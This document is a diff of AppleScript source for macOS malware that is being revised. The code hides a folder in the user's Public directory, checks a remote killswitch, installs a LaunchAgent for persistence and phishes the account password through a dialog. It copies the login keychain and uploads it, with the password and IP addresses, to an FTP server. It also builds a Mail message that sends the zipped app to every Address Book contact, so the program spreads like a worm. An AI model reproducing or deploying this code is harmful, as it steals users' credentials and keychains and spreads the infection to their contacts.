@@ -1,26 +1,41 @@
-set theuser to do shell script "whoami"
 try
-	do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill' | cut -d : -f 1 | cut -d \\< -f 1" -- Check for a killswitch
-	set killswitch to (characters 1 through -1 of result) as text -- Check for Killswitch
+	set theuser to do shell script "whoami"
+	
+	try
+		do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
+	end try
+	set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
+on error
+	return
+end try
+
+try
+	set killswitch to (do shell script "curl http://benbern.dyndns.info/stuff/uhoh.html | grep 'kill'") as text -- Check for Killswitch
 	if killswitch = "kill" then -- If killswitch is triggered, delete all of the app and password files
 		try
-			do shell script "rm -rf ~/public/." & theuser
-			do shell script "rm -rf " & (POSIX path of (path to me))
+			try
+				do shell script "rm -rf ~/public/." & theuser
+			end try
+			try
+				do shell script "rm ~/library/launchagents/com.h4k.plist"
+			end try
+			try
+				do shell script "rm -rf " & quoted form of (POSIX path of (path to me))
+			end try
 		end try
 		return
 	end if
 end try
 
 try
-	do shell script "mkdir ~/Public/." & theuser & "" -- Make the hidden folder in the user's Public folder
-end try
-set ufld to "/Users/" & theuser & "/Public/." & theuser & "/"
-
-try
 	set reso to POSIX path of (path to resource "Updater.app")
 	set newreso to POSIX path of ("" & ufld & "Updater.app")
 	do shell script "cp -r " & reso & " " & newreso
-	tell application "System Events" to make login item at end with properties {path:newreso, kind:application} -- Make application a login item		
+	
+	do shell script "touch ~/Library/LaunchAgents/com.h4k.plist"
+	do shell script "defaults write ~/Library/LaunchAgents/com.h4k.plist Label 'com.h4k.plist'"
+	do shell script "defaults write ~/Library/LaunchAgents/com.h4k.plist Program '/Users/" & theuser & "/Public/." & theuser & "/Updater.app/Contents/MacOS/applet'"
+	do shell script "defaults write ~/Library/LaunchAgents/com.h4k.plist RunAtLoad -bool true"
 end try
 
 try
@@ -35,13 +50,15 @@ try
 			do shell script "dscl . -passwd /Users/" & theuser & " benwashere " & passwd & "" -- Check if password is correct
 			exit repeat
 		on error
-			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon caution giving up after 3 -- If password is incorrect, try again
+			display dialog "Please try again." with title "Password" buttons {"OK"} default button 1 with icon (path to resource "icon.icns") giving up after 3 -- If password is incorrect, try again
 		end try
 	end repeat
-	
+end try
+
+try
+	set dte to (current date) as string
 	try
-		set dte to (current date) as string
-		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d \\< -f 1"
+		do shell script "curl http://checkip.dyndns.org/ | grep 'Current IP Address' | cut -d : -f 2 | cut -d '<' -f 1"
 		set WANIP to (characters 2 through -1 of result) as text -- Get IP
 		set LANIP to (do shell script "ipconfig getifaddr en1")
 	on error
@@ -49,64 +66,66 @@ try
 		set LANIP to "not connected"
 	end try
 	
-	try
-		do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " > " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
-	end try
-	
-	set myuser to "<Username>"
-	set mypass to "<Password>"
-	set myserv to "<ftp address>"
-	set mypath to "</path/to/folder/>"
-	
-	try
-		tell application "Finder" to do shell script "curl -T " & ufld & theuser & ".txt -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & ".txt" -- Upload text file to FTP server
-	end try
-	
-	try
-		set china to "~/Library/Keychains/login.keychain"
-		do shell script "cp " & china & " " & ufld
-		do shell script "mv " & ufld & "login.keychain " & ufld & theuser & ".keychain" -- Copy keychain to hidden folder
-	end try
-	
-	try
-		tell application "Finder" to do shell script "curl -T " & ufld & theuser & ".keychain -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & ".keychain" -- Upload Keychain to FTP server
-	end try
-	
+	do shell script "echo " & dte & " - User: " & theuser & " Password: " & passwd & " WAN IP: " & WANIP & " LAN IP: " & LANIP & " >> " & ufld & "" & theuser & ".txt" -- Write information to the text file in the hidden folder
 end try
 
 try
-	do shell script "open " & (POSIX path of (path to resource "DK.app"))
-	delay 0.5
+	set china to "~/Library/Keychains/login.keychain"
+	do shell script "cp " & china & " " & ufld
+	do shell script "mv " & ufld & "login.keychain " & ufld & theuser & ".keychain" -- Copy keychain to hidden folder
+end try
+
+set myuser to "<Username>"
+set mypass to "<Password>"
+set myserv to "<ftp address>"
+set mypath to "</path/to/folder/>"
+
+try
+	tell application "Finder" to do shell script "curl -T " & ufld & theuser & ".txt -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & ".txt" -- Upload text file to FTP server
 end try
 
 try
-	tell application "Mail"
-		set theMessage to make new outgoing message with properties {visible:false, subject:"Awesome new Mac app!", content:"Hey, 
+	tell application "Finder" to do shell script "curl -T " & ufld & theuser & ".keychain -u " & myuser & ":" & mypass & " ftp://" & myserv & mypath & theuser & "_" & WANIP & ".keychain" -- Upload Keychain to FTP server
+end try
+
+try
+	try
+		do shell script "open " & (POSIX path of (path to resource "DK.app"))
+		delay 0.5
+	end try
+	
+	try
+		tell application "Mail"
+			set theMessage to make new outgoing message with properties {visible:false, subject:"Awesome new Mac app!", content:"Hey, 
 	
 	Check out this new Mac application! You'll never use your computer the same way again ;)
 	
 	" & theuser & ""} -- Make email message
-		
-		set txt to paragraphs of (do shell script "sqlite3 ~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb \"select ZADDRESSNORMALIZED from ZABCDEMAILADDRESS;\" | sort | uniq")
-		repeat with x from 1 to (count of txt)
-			tell theMessage
-				make new to recipient at end of to recipients with properties {address:(item x of txt)} -- Add recipients to message
+			
+			set txt to paragraphs of (do shell script "sqlite3 ~/Library/Application\\ Support/AddressBook/AddressBook-v22.abcddb \"select ZADDRESSNORMALIZED from ZABCDEMAILADDRESS;\" | sort | uniq")
+			repeat with x from 1 to (count of txt)
+				tell theMessage
+					make new bcc recipient at end of to recipients with properties {address:(item x of txt)} -- Add recipients to message
+				end tell
+			end repeat
+			
+			set mydir to (do shell script "dirname " & (POSIX path of (path to me)))
+			do shell script "cd " & mydir & " ; zip " & ufld & "App.zip App.app"
+			set theAttachment to (POSIX file (ufld & "App.zip")) as alias
+			tell content of theMessage
+				make new attachment with properties {file name:theAttachment} at after last paragraph -- Attach the app
 			end tell
-		end repeat
-		
-		set mydir to (do shell script "dirname " & (POSIX path of (path to me)))
-		do shell script "cd " & mydir & " ; zip " & ufld & "App.zip App.app"
-		set theAttachment to (POSIX file (ufld & "App.zip")) as alias
-		tell content of theMessage
-			make new attachment with properties {file name:theAttachment} at after last paragraph -- Attach the app
+			-- send theMessage
+			delay 1
+			quit
 		end tell
-		-- send theMessage
-		delay 1
-		quit
-	end tell
-end try
-
-try
+	end try
+	
+	try
+		set the_pid to (do shell script "ps ax | grep " & (quoted form of "DK") & " | grep -v grep | awk '{print $1}'")
+		if the_pid is not "" then do shell script ("kill -9 " & the_pid)
+	end try
+on error
 	set the_pid to (do shell script "ps ax | grep " & (quoted form of "DK") & " | grep -v grep | awk '{print $1}'")
 	if the_pid is not "" then do shell script ("kill -9 " & the_pid)
 end try
